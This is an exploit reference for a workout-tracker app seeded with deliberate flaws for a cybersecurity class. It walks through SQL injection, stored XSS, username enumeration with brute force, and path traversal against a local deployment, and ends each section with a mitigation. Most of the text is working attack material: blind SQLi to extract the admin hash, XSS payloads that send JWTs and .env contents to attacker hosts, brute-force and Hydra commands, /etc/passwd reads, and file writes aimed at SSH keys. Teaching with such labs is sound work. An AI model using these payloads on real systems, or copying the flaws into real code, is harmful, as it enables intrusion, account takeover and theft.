# ATTACKS.md — Deliberate Vulnerabilities Reference

This document describes the four vulnerabilities intentionally planted in this
codebase for the cybersecurity class, and walks through how to exploit each
one. Every exploit was tested against a local dev deployment:

- Backend: `http://localhost:8080` (Spring Boot)
- Frontend: `http://localhost:5173` (Vite, proxies `/api` and `/uploads` to backend)
- Database: PostgreSQL 17 via `docker-compose up -d`

Seeded accounts (see [DataInitializer.java](backend/src/main/java/com/workout_tracker/backend/config/DataInitializer.java)):

| Username | Password   | Role       |
|----------|------------|------------|
| admin    | admin123   | ROLE_ADMIN |
| bob      | password   | ROLE_USER  |
| test     | 1234       | ROLE_USER  |

---

## 1. SQL Injection — `/api/posts/search`

### Location
- [PostService.java](backend/src/main/java/com/workout_tracker/backend/service/PostService.java) — `searchPosts(String query)`
- [PostController.java](backend/src/main/java/com/workout_tracker/backend/controller/PostController.java) — `GET /api/posts/search?q=...`

### Why it's vulnerable
The query parameter is concatenated directly into the SQL string executed by
`JdbcTemplate`:

```java
String sql = "SELECT id FROM posts WHERE title LIKE '%" + query + "%' ORDER BY created_at DESC";
List<Long> ids = jdbcTemplate.queryForList(sql, Long.class);
```

There's no parameter binding and no input sanitization, so any SQL metacharacter
(`'`, `--`, `UNION`, etc.) is interpreted as SQL.

### Exploit 1 — detect the vulnerability

A single-quote breaks the string and produces a syntax error:

```bash
curl -s 'http://localhost:8080/api/posts/search?q='\''
```

Response: `{"error":"An unexpected error occurred"}` (500). Watch the backend
log — you'll see the broken SQL printed:

```
Executing search SQL: SELECT id FROM posts WHERE title LIKE '%'%' ORDER BY created_at DESC
```

### Exploit 2 — always-true match (dumps every post)

```bash
curl -s "http://localhost:8080/api/posts/search?q=%25%27%20OR%20%271%27%3D%271"
#                                             %   '    OR     '1'='1
```

Decoded `q`: `%' OR '1'='1`

Resulting SQL:
```sql
SELECT id FROM posts WHERE title LIKE '%%' OR '1'='1%' ORDER BY created_at DESC
```

Every post is returned regardless of title.

### Exploit 3 — UNION-based data exfiltration

Since the endpoint only returns post IDs (then re-fetches them via JPA), direct
column leakage is blunted — but you can still exfiltrate data via a **blind**
approach or by coercing an error that contains DB values.

**Blind (boolean-based) exfil of the admin password hash, one character at a time:**

```bash
# Is the first char of admin's password hash '$'? (BCrypt always starts with $2a)
curl -s "http://localhost:8080/api/posts/search?q=%25%27%20AND%20(SELECT%20substring(password%2C1%2C1)%20FROM%20users%20WHERE%20username%3D%27admin%27)%3D%27%24%27--%20"
```

Decoded `q`: `%' AND (SELECT substring(password,1,1) FROM users WHERE username='admin')='$'-- `

SQL executed:
```sql
SELECT id FROM posts WHERE title LIKE '%%' AND (SELECT substring(password,1,1) FROM users WHERE username='admin')='$'-- %' ORDER BY created_at DESC
```

- If the character matches → posts are returned → infer the char.
- If not → empty list.

Loop this over characters to dump the full BCrypt hash, then crack it offline
with hashcat (`-m 3200` for bcrypt). Combined with Attack #3 (weak admin
password), the hash cracks in seconds.

### Exploit 4 — side-channel error-based leak (PostgreSQL)

PostgreSQL error messages include problematic values. Force a cast error that
includes data from the `users` table:

```
q=%' UNION SELECT CAST((SELECT password FROM users WHERE username='admin') AS INTEGER)--
```

The cast fails and the error message printed to the log (and sometimes
reflected in the HTTP 500 response body if error details leak) contains the
password hash.

### Mitigation
Use parameterized queries:
```java
jdbcTemplate.queryForList(
    "SELECT id FROM posts WHERE title LIKE ? ORDER BY created_at DESC",
    Long.class,
    "%" + query + "%");
```
Or better, move the search into the JPA repository:
```java
List<Post> findByTitleContainingIgnoreCaseOrderByCreatedAtDesc(String title);
```

---

## 2. Stored Cross-Site Scripting (XSS)

### Location
- [FeedPage.tsx:187](frontend/src/pages/FeedPage.tsx) — post body in feed list
- [PostDetailPage.tsx:112](frontend/src/pages/PostDetailPage.tsx) — post body in detail view
- [PostDetailPage.tsx:173](frontend/src/pages/PostDetailPage.tsx) — each comment body

### Why it's vulnerable
All three render sites use `dangerouslySetInnerHTML`:

```tsx
<div dangerouslySetInnerHTML={{ __html: post.body }} />
```

The backend stores the body as raw text with no sanitization. The browser
executes any HTML/JavaScript the attacker submits.

React's default `{post.body}` would HTML-escape the content; this helper
opts out of that protection.

### Exploit 1 — proof-of-concept alert

1. Log in (e.g., `bob` / `password`).
2. Create a new post. In the **body** field, paste:

   ```html
   <img src=x onerror="alert('XSS by '+document.domain)">
   ```

3. Any user (including anonymous visitors) viewing the feed or the post
   detail page gets a JavaScript alert.

Note: `<script>` tags injected via `innerHTML` after the initial page load
**don't execute** — browsers don't evaluate them that way. Use
`onerror`/`onload`/`onfocus` handlers on a regular HTML element instead
(classic `<img src=x onerror=...>` or `<svg onload=...>`).

### Exploit 2 — steal JWT from another user

The authenticated user's token is in `localStorage.token` (see
[AuthContext.tsx](frontend/src/context/AuthContext.tsx)). Submit a comment or
post with:

```html
<img src=x onerror="fetch('http://attacker.example/steal?t='+encodeURIComponent(localStorage.token))">
```

To test locally, spin up a catch-all listener in another terminal:

```bash
python3 -m http.server 9999
```

Then use `http://localhost:9999/steal?t=...` as the exfil target. Every
logged-in user that loads the page sends their JWT to your listener. Paste
the received token into `Authorization: Bearer <token>` and you've
impersonated them.

### Exploit 3 — drive-by admin action

If the victim is an admin, you can have their browser issue admin-only
requests automatically:

```html
<img src=x onerror="
  fetch('/api/posts/1',{
    method:'DELETE',
    headers:{'Authorization':'Bearer '+localStorage.token}
  });
">
```

Any admin who loads the malicious post deletes post #1 on your behalf.

### Mitigation
- Render bodies as plain text (`{post.body}`) — React auto-escapes.
- If rich text is required, sanitize server-side with a library like
  OWASP Java HTML Sanitizer, *and* use `DOMPurify` on the frontend before
  setting `dangerouslySetInnerHTML`.
- Move the JWT out of `localStorage` into an `HttpOnly` cookie so it's not
  reachable from JavaScript (defence in depth; doesn't fix the XSS itself).

---

## 3. Weak Credentials + Brute Force + Username Enumeration

### Location
- [RegisterRequest.java:19](backend/src/main/java/com/workout_tracker/backend/dto/auth/RegisterRequest.java) — password minimum is `1`
- [DataInitializer.java](backend/src/main/java/com/workout_tracker/backend/config/DataInitializer.java) — seeds three weak users
- [AuthService.java:76](backend/src/main/java/com/workout_tracker/backend/service/AuthService.java) — differentiates "user does not exist" vs "wrong password"
- No rate limiting anywhere on `/api/auth/login`

### Why it's vulnerable

Three independent weaknesses stack:

1. **No rate limiting** — the login endpoint accepts unlimited attempts with
   no lockout, no CAPTCHA, no throttle.
2. **Weak passwords allowed** — registration only requires a password of at
   least 1 character; no complexity, no dictionary check.
3. **Username enumeration** — the error response tells you whether a
   username exists:
   - `User 'alice' does not exist` (username not in DB)
   - `Wrong password for user 'alice'` (username exists, password wrong)

Combined, an attacker can cheaply enumerate valid usernames, then hammer
common passwords against only those accounts.

### Exploit 1 — enumerate valid usernames

```bash
for u in admin root bob alice charlie test user guest; do
  resp=$(curl -s -X POST http://localhost:8080/api/auth/login \
    -H 'Content-Type: application/json' \
    -d "{\"username\":\"$u\",\"password\":\"wrong\"}")
  case "$resp" in
    *"does not exist"*) echo "[ ] $u" ;;
    *"Wrong password"*) echo "[+] $u EXISTS" ;;
    *) echo "[!] $u $resp" ;;
  esac
done
```

Output on a stock deployment:

```
[+] admin EXISTS
[ ] root
[+] bob EXISTS
[ ] alice
[ ] charlie
[+] test EXISTS
[ ] user
[ ] guest
```

### Exploit 2 — brute-force a known account

Build a small wordlist and spray it against a known-valid username:

```bash
cat > passwords.txt <<'EOF'
password
123456
admin
admin123
1234
letmein
qwerty
welcome
EOF

while read -r p; do
  resp=$(curl -s -X POST http://localhost:8080/api/auth/login \
    -H 'Content-Type: application/json' \
    -d "{\"username\":\"admin\",\"password\":\"$p\"}")
  if echo "$resp" | grep -q '"token"'; then
    echo "HIT: admin / $p"
    echo "$resp"
    break
  fi
done < passwords.txt
```

Hits `admin / admin123` within a few requests.

### Exploit 3 — automated credential stuffing with Hydra

```bash
hydra -L users.txt -P rockyou.txt \
  localhost -s 8080 \
  http-post-form "/api/auth/login:{\"username\":\"^USER^\",\"password\":\"^PASS^\"}:does not exist:H=Content-Type\: application/json"
```

The `:does not exist` condition filters out nonexistent-user responses, so
Hydra only counts real attempts against valid accounts.

### Mitigation
- Restore `@Size(min = 12)` plus a common-password blocklist.
- Return a generic `"Invalid username or password"` for all login failures.
- Add a failed-attempt counter per IP and per account, with exponential
  backoff or a lockout after N attempts (e.g., Bucket4j, Spring Security's
  `LoginAttemptService`).
- Remove the hardcoded weak seeds from `DataInitializer`.

---

## 4. Path Traversal (Upload + Download)

### Location
- **Upload** — [FileStorageService.java](backend/src/main/java/com/workout_tracker/backend/service/FileStorageService.java) `store(MultipartFile, String filenameOverride)`
- **Upload entry point** — [PostController.java](backend/src/main/java/com/workout_tracker/backend/controller/PostController.java) `create(..., @RequestParam("filename") ...)`
- **Download** — [FileController.java](backend/src/main/java/com/workout_tracker/backend/controller/FileController.java) `GET /api/files?path=...`

### Why it's vulnerable

**Upload side:** If the request includes a `filename` form field, it's used
verbatim to resolve a target path:
```java
Path target = uploadPath.resolve(name);  // name may contain "../"
Files.createDirectories(target.getParent());
file.transferTo(target);
```
`Path.resolve("../../foo")` escapes the upload directory. The uploaded file
lands wherever the JVM has write permission.

**Download side:** The controller takes the `path` query param and hands it
straight to `resolve()`:
```java
public Path resolve(String relativePath) {
    return uploadPath.resolve(relativePath);
}
```
No `.normalize()`, no containment check. `?path=../../../../etc/passwd`
returns the contents of `/etc/passwd`.

### Exploit 1 — local file read via download endpoint (LFI)

```bash
curl -s 'http://localhost:8080/api/files?path=../../../../../etc/passwd'
```

Returns:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

Useful targets on a typical Linux dev box:

| Target                                    | Payload (`path=`)                                                |
|-------------------------------------------|------------------------------------------------------------------|
| `/etc/passwd`                             | `../../../../etc/passwd`                                         |
| `/etc/hostname`                           | `../../../../etc/hostname`                                       |
| `~/.bash_history`                         | `../../../../home/horia/.bash_history`                           |
| Project `.env` (DB creds, JWT secret)     | `../../.env`                                                     |
| `application-dev.yaml`                    | `../src/main/resources/application-dev.yaml`                     |
| Spring Boot Actuator health (if reachable)| n/a                                                              |

Exact `../` count depends on where the JVM was started from relative to the
target file. For a `./gradlew bootRun` launched from `backend/`, the
upload dir resolves to `backend/uploads` — so:

- `../../etc/passwd` (two `../`) → `/etc/passwd` is two levels up from
  `backend/uploads`? No: `uploads` → `backend` (1) → `Cybersec` (2) →
  `horia` (3) → `home` (4) → `/` (5). Use `../../../../../etc/passwd`.

Count levels from `backend/uploads` to `/` on your machine — it's typically
five or more `../` for absolute root-relative targets.

### Exploit 2 — arbitrary file write via upload

Craft a multipart request with a `filename` field containing `../`:

```bash
echo 'pwned by attacker' > /tmp/payload.txt

# Log in first to grab a token
TOKEN=$(curl -s -X POST http://localhost:8080/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"bob","password":"password"}' | jq -r .token)

# Upload with a traversing filename
curl -s -X POST http://localhost:8080/api/posts \
  -H "Authorization: Bearer $TOKEN" \
  -F 'title=test' \
  -F 'body=hello' \
  -F 'image=@/tmp/payload.txt' \
  -F 'filename=../../../../tmp/pwned.txt'

cat /tmp/pwned.txt
# pwned by attacker
```

**Impact amplifications:**
- Overwrite `~/.ssh/authorized_keys` with an attacker-controlled public key
  (if the JVM runs as a user with an SSH account).
- Drop a JSP/WAR into a servlet container's webapp dir for RCE (not
  applicable here — Spring Boot with embedded Tomcat doesn't reload).
- Write a cron job file into `/etc/cron.d/` (requires root — usually won't
  work but worth testing).
- Corrupt the running application's config files (`application-dev.yaml`,
  the Gradle wrapper, etc.) — next restart is compromised.

### Exploit 3 — combined: post that auto-exfiltrates via image tag

Chain XSS (#2) + download traversal:

1. Create a post with body:
   ```html
   <img src="/api/files?path=../../.env" onerror="fetch('http://attacker/?d='+encodeURIComponent(this.previousSibling?.src))">
   ```
2. The `.env` file can't be rendered as an image, so `onerror` fires; you
   can also just fetch the path directly from JavaScript and POST the
   contents. Real demo:

   ```html
   <script>fetch('/api/files?path=../../.env').then(r=>r.text()).then(t=>fetch('http://attacker/?d='+encodeURIComponent(t)))</script>
   ```

   (remember inline `<script>` needs to be in the initial HTML; via
   `innerHTML` you'd use an event handler that does the same `fetch`).

### Mitigation

**Upload side:**
```java
String safe = Paths.get(filenameOverride).getFileName().toString();   // strip any path components
String ext = extractExtension(safe);
String filename = UUID.randomUUID() + ext;
Path target = uploadPath.resolve(filename);
if (!target.normalize().startsWith(uploadPath)) {
    throw new SecurityException("Path traversal detected");
}
```

**Download side:**
```java
Path target = uploadPath.resolve(path).normalize();
if (!target.startsWith(uploadPath)) {
    throw new SecurityException("Path traversal detected");
}
```

Or drop the explicit download endpoint altogether and serve images through
Spring's `ResourceHttpRequestHandler` (via `WebMvcConfig` mapping
`/uploads/**`) — that handler has built-in traversal protection.

---

## Reference: files touched for the vulnerabilities

| Vulnerability         | Files modified / added                                                                |
|-----------------------|---------------------------------------------------------------------------------------|
| SQL injection         | `PostService.java`, `PostController.java`, `SecurityConfig.java`, `api/posts.ts`, `FeedPage.tsx` |
| Stored XSS            | `FeedPage.tsx`, `PostDetailPage.tsx`                                                  |
| Weak creds / BF       | `RegisterRequest.java`, `DataInitializer.java`, `AuthService.java`, `GlobalExceptionHandler.java` |
| Path traversal        | `FileStorageService.java`, `PostService.java`, `PostController.java`, `FileController.java` (new), `SecurityConfig.java` |
